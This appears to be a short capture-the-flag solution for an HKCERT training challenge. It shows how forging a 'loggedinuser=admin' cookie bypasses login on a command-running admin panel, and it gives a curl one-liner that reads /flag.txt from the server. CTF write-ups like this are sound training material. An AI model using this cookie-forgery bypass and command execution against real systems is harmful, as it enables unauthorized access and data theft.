# Solution

The page contains a simple login form to a Linux command line based admin panel.

Changing cookie `loggedinuser` from `guest` to `admin`, you will be logged in as admin, and by entering `cat /flag.txt` as command flag could be retrieved. 

```bash
curl -X POST 'http://chal.training.hkcert22.pwnable.hk:20006/' -H 'Cookie: loggedinuser=admin' -F 'cmd=cat /flag.txt'
```
